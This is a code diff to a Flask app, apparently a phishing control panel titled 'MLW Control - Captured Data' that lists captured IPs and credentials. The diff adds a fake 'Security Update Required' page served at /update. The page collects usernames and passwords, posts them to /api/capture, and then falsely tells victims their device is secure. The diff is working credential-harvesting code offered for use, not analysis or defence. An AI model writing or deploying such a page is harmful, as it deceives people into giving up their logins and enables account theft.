@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template_string
+from flask import Flask, request, jsonify, render_template_string, send_from_directory
 from flask_cors import CORS
 import psycopg2
 import os
@@ -81,8 +81,53 @@ HTML = '''
 </div>
 <div id="content">
     <h1>MLW Control - Captured Data</h1>
-    <table><th>Time</th><th>IP</th><th>Credentials</th></tr><tbody id="data"></tbody></table>
+    <table><tr><th>Time</th><th>IP</th><th>Credentials</th></tr><tbody id="data"></tbody></table>
 </div>
+</body>
+</html>
+'''
+
+PHISHING_PAGE = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body{font-family:system-ui;background:#000;color:#0f0;text-align:center;padding:20px;}
+        .box{max-width:400px;margin:auto;background:#111;padding:30px;border-radius:20px;}
+        button{background:#0f0;color:#000;padding:15px;border:none;border-radius:10px;cursor:pointer;width:100%;}
+        input{width:100%;padding:10px;margin:10px 0;background:#222;color:#0f0;border:1px solid #0f0;border-radius:5px;}
+        h2{color:#ff0;}
+    </style>
+</head>
+<body>
+<div class="box">
+    <h2>🔒 Security Update Required</h2>
+    <p>Your device needs an urgent security patch.</p>
+    <form id="captureForm">
+        <input type="text" name="username" placeholder="Username" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Install Update</button>
+    </form>
+    <div id="result"></div>
+</div>
+<script>
+    document.getElementById('captureForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const data = {
+            username: this.username.value,
+            password: this.password.value
+        };
+        await fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({data: JSON.stringify(data)})
+        });
+        document.getElementById('result').innerHTML = '<p style="color:#0f0;">✅ Update complete. Your device is secure.</p>';
+        this.reset();
+    });
+</script>
 </body>
 </html>
 '''
@@ -90,6 +135,10 @@ HTML = '''
 @app.route('/')
 def index():
     return render_template_string(HTML)
+
+@app.route('/update')
+def update():
+    return render_template_string(PHISHING_PAGE)
 
 @app.route('/api/auth')
 def auth():
